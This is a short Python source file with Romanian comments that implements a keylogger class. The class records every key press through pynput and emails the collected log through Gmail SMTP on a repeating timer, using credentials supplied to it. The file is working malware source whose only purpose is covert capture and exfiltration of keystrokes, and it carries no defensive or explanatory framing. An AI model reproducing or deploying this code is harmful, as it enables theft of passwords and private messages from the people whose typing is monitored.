import pynput.keyboard
import smtplib
import time
import threading
#este clasa a clogger

class Keylogger:
    def __init__(self, interval, email, password):
        self.log = "Keylogger Activat"
        self.timer = interval
        self.email = email
        self.password = password

    def append_to_log(self, str):
        self.log += str
        

    def process_key_press(self,key):
        try:
            current_key = str(key.char) # adica doar ce e caracter
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key  = " " + str(key) + " "
        self.append_to_log(current_key)


    def send_email(self,email,password,message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email,email,message)
        server.quit()


    def report(self):
        self.send_email(self.email, self.password,"\n\n" + self.log)
        self.log = ""
        # la 5 secunde printeaza logul si apoi il seteaza la loc
        timer = threading.Timer(self.timer, self.report)
        timer.start()



    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()